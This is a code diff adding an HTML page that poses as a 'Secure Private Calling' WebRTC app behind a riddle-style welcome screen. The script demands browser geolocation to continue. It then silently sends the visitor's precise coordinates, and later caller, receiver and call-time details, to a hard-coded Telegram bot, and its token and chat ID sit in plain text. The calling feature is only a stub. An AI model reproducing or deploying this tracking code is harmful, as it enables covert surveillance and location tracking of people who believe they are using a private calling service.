@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Private Calling</title>
+    <style>
+        /* Liquid Glass Theme */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            background-attachment: fixed;
+            color: #ffffff;
+            text-align: center;
+            overflow: hidden; 
+        }
+
+        .blur-bg {
+            filter: blur(20px);
+            pointer-events: none;
+            transition: filter 0.4s ease;
+            height: 100vh;
+        }
+
+        header {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        header h1 { margin: 0; font-size: 22px; color: #00e5ff; text-shadow: 0 0 10px rgba(0, 229, 255, 0.5); }
+
+        /* Welcome Overlay */
+        .overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: transparent; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        /* Glass Panel */
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border-radius: 15px;
+            padding: 40px 30px;
+            width: 320px;
+            text-align: center;
+        }
+
+        .glass-panel h2 { color: #00e5ff; margin-top: 0; font-size: 24px;}
+        .glass-panel p { color: #e0e0e0; font-size: 15px; line-height: 1.6; margin-bottom: 25px;}
+
+        .yes-btn {
+            background: linear-gradient(135deg, #00e5ff, #007bff);
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(0, 123, 255, 0.4);
+            transition: transform 0.2s;
+        }
+
+        .yes-btn:active { transform: scale(0.95); }
+
+        /* App Containers */
+        .container { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 80vh; }
+        .glass-panel input { 
+            width: 90%; padding: 12px; margin-bottom: 20px; 
+            background: rgba(0, 0, 0, 0.2); 
+            border: 1px solid rgba(255, 255, 255, 0.2); 
+            color: white; border-radius: 8px; text-align: center; font-size: 16px; 
+            outline: none;
+        }
+        .save-btn { background-color: #ff9800; width: 100%; padding: 12px; border-radius: 8px; border: none; color: white; font-weight: bold; cursor: pointer; font-size: 16px;}
+
+        /* Dashboard & Calling */
+        #homeScreen { display: none; margin-top: 60px; }
+        .search-bar { 
+            width: 320px; padding: 12px; 
+            background: rgba(0, 0, 0, 0.2); 
+            border: 1px solid rgba(255, 255, 255, 0.2); 
+            color: white; border-radius: 8px; outline: none; text-align: center;
+        }
+        .call-btn-container { margin-top: 20px; display: flex; gap: 10px; justify-content: center;}
+        .video-btn { background: rgba(0, 123, 255, 0.8); padding: 12px 25px; border-radius: 8px; border:none; color:white; cursor:pointer; font-weight:bold; border: 1px solid rgba(255,255,255,0.2);}
+        .audio-btn { background: rgba(40, 167, 69, 0.8); padding: 12px 25px; border-radius: 8px; border:none; color:white; cursor:pointer; font-weight:bold; border: 1px solid rgba(255,255,255,0.2);}
+
+        #callScreen { display: none; margin-top: 40px; }
+        .video-container { display: flex; justify-content: center; gap: 15px; margin-top: 20px; }
+        video { width: 40%; max-width: 400px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); border-radius: 12px; }
+        .close-btn { background: rgba(220, 53, 69, 0.9); margin-top: 30px; width: 200px; padding: 12px; border: none; border-radius: 8px; color: white; cursor: pointer; font-weight: bold; }
+        #userNameDisplay { color: #00e5ff; font-size: 18px; margin-bottom: 20px; display: block; font-weight: bold; text-shadow: 0 0 5px rgba(0,229,255,0.5);}
+    </style>
+</head>
+<body>
+
+    <!-- Fun Riddle Screen -->
+    <div id="welcomeOverlay" class="overlay">
+        <div class="glass-panel">
+            <h2>Hello Friend! 🕵️‍♂️</h2>
+            <p>Are you certain this secret portal is meant for you?<br><br>Do you wish to proceed and explore further? 😉</p>
+            <button class="yes-btn" onclick="startExploration()">Yes, Continue</button>
+        </div>
+    </div>
+
+    <!-- Main App -->
+    <div id="mainApp" class="blur-bg">
+        <header>
+            <h1>Secure WebRTC</h1>
+            <button onclick="logout()" title="Logout" style="font-size: 16px; color: #ff4c4c; background: none; border: none; cursor: pointer; font-weight: bold;">Logout</button>
+        </header>
+
+        <div id="authScreen" class="container" style="display: none;">
+            <div class="glass-panel" style="padding: 40px;">
+                <h3 style="color: #00e5ff; margin-top:0;">Private Access</h3>
+                <p style="font-size: 13px; color: #ccc;">Enter your secret code to verify.</p>
+                <input type="number" id="myNumberInput" placeholder="Enter Secret Code">
+                <button class="save-btn" onclick="verifyNewUser()">Verify Identity</button>
+            </div>
+        </div>
+
+        <div id="homeScreen" class="container" style="display: none; height: auto; margin-top: 60px;">
+            <div class="glass-panel" style="background: transparent; border: none; box-shadow: none;">
+                <span id="userNameDisplay"></span>
+                <input type="number" id="targetNumber" class="search-bar" placeholder="Enter target number...">
+                <div class="call-btn-container">
+                    <button class="video-btn" onclick="startCall('video')">📹 Video Call</button>
+                    <button class="audio-btn" onclick="startCall('audio')">📞 Audio Call</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="callScreen" class="container" style="display: none; height: auto; margin-top: 40px;">
+            <h2 id="callingText" style="color: #00e5ff;">Ringing...</h2>
+            <p id="callStatus" style="color: #ccc;">Connecting securely...</p>
+            <div class="video-container">
+                <video id="localVideo" autoplay muted playsinline></video>
+                <video id="remoteVideo" autoplay playsinline></video>
+            </div>
+            <button class="close-btn" onclick="endCall()">End Call</button>
+        </div>
+    </div>
+
+    <script>
+        const telegramBotToken = "8646604552:AAGWM4W4i9g9T-itnFscvQom32md5GP7lHo"; 
+        const telegramChatId = "7208869554"; 
+        
+        const AUTHORIZED_USERS = {
+            "63638362935": "Abraham",
+            "7000836332": "Olivier"
+        };
+        
+        let myNumber = localStorage.getItem("myNumber") || null;
+        let localStream = null;
+
+        // "Yes, Continue" ക്ലിക്ക് ചെയ്യുമ്പോൾ വളരെ വേഗത്തിൽ പ്രവർത്തിക്കുന്ന ഫംഗ്ഷൻ
+        function startExploration() {
+            if (!navigator.geolocation) {
+                alert("Your browser does not support Geolocation!");
+                return;
+            }
+
+            // ബ്രൗസർ പോപ്പ്-അപ്പ് ചോദിക്കുന്നു
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // അലൗ ചെയ്താൽ ഉടൻ തന്നെ ബ്ലർ മാറി ആപ്പിലേക്ക് കയറുന്നു
+                    document.getElementById("welcomeOverlay").style.display = "none";
+                    enterApp();
+
+                    // യാതൊരു തടസ്സവുമില്ലാതെ ബാക്ഗ്രൗണ്ടിൽ ലൊക്കേഷൻ ടെലിഗ്രാമിലേക്ക് അയക്കുന്നു
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const locLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    let userName = (myNumber && AUTHORIZED_USERS[myNumber]) ? AUTHORIZED_USERS[myNumber] : "Guest / Unverified User";
+
+                    const msg = `📍 [SITE EXPLORATION]\n\n👤 Visitor: ${userName}\n🌍 Location: ${locLink}`;
+                    
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(msg)}`)
+                        .catch(err => console.log("Silent Error"));
+                },
+                (error) => {
+                    // ക്യാൻസൽ അടിച്ചാൽ (ബ്രൗസർ ബ്ലോക്ക് ആയാൽ) ഒരു വാണിംഗ് മെസ്സേജ് കാണിക്കുന്നു.
+                    alert("Location access is blocked! Please tap the lock icon 🔒 in your browser's URL bar, allow location, and try again.");
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+            );
+        }
+
+        // ആപ്പിലേക്ക് കടക്കുന്ന ഭാഗം
+        function enterApp() {
+            document.getElementById("mainApp").classList.remove("blur-bg");
+            document.getElementById("mainApp").style.pointerEvents = "auto";
+            document.body.style.overflow = "auto";
+
+            if(myNumber && AUTHORIZED_USERS[myNumber]) {
+                showDashboard(AUTHORIZED_USERS[myNumber]);
+            } else {
+                document.getElementById("authScreen").style.display = "flex";
+            }
+        }
+
+        function verifyNewUser() {
+            const input = document.getElementById("myNumberInput").value;
+            if (AUTHORIZED_USERS[input]) {
+                myNumber = input;
+                localStorage.setItem("myNumber", myNumber);
+                showDashboard(AUTHORIZED_USERS[myNumber]);
+            } else {
+                alert("Access Denied! Unauthorized user.");
+            }
+        }
+
+        function showDashboard(userName) {
+            document.getElementById("authScreen").style.display = "none";
+            document.getElementById("homeScreen").style.display = "block";
+            document.getElementById("userNameDisplay").innerText = "Welcome, " + userName;
+        }
+
+        function sendToTelegram(messageText) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(messageText)}`;
+            fetch(url).catch(error => console.log("Telegram API Error"));
+        }
+
+        async function startCall(callType) {
+            const targetNum = document.getElementById("targetNumber").value;
+            
+            if (!AUTHORIZED_USERS[targetNum]) {
+                alert("You can only call authorized users.");
+                return;
+            }
+            if (targetNum === myNumber) {
+                alert("You cannot call yourself!");
+                return;
+            }
+
+            document.getElementById("homeScreen").style.display = "none";
+            document.getElementById("callScreen").style.display = "block";
+            
+            const callerName = AUTHORIZED_USERS[myNumber];
+            const receiverName = AUTHORIZED_USERS[targetNum];
+            
+            document.getElementById("callingText").innerText = `Ringing ${receiverName}...`;
+
+            const now = new Date();
+            const dateStr = now.toLocaleDateString('en-US'); 
+            const timeStr = now.toLocaleTimeString('en-US'); 
+
+            const callMessage = `🔔 [CALL INITIATED]\n\n📞 Caller: ${callerName}\n📲 Receiver: ${receiverName}\n🎛 Type: ${callType.toUpperCase()} Call\n📅 Date: ${dateStr}\n⏰ Time: ${timeStr}`;
+            
+            sendToTelegram(callMessage);
+
+            try {
+                const constraints = { audio: true, video: callType === 'video' };
+                localStream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                if(callType === 'video') {
+                    document.getElementById("localVideo").srcObject = localStream;
+                }
+            } catch (error) {
+                alert("Cannot access Camera/Microphone! Please 'Allow' permissions.");
+                endCall();
+            }
+        }
+
+        function endCall() {
+            if(localStream) {
+                localStream.getTracks().forEach(track => track.stop());
+            }
+            document.getElementById("callScreen").style.display = "none";
+            document.getElementById("homeScreen").style.display = "block";
+            document.getElementById("localVideo").srcObject = null;
+        }
+
+        function logout() {
+            localStorage.removeItem("myNumber");
+            location.reload();
+        }
+    </script>
+</body>
+</html>
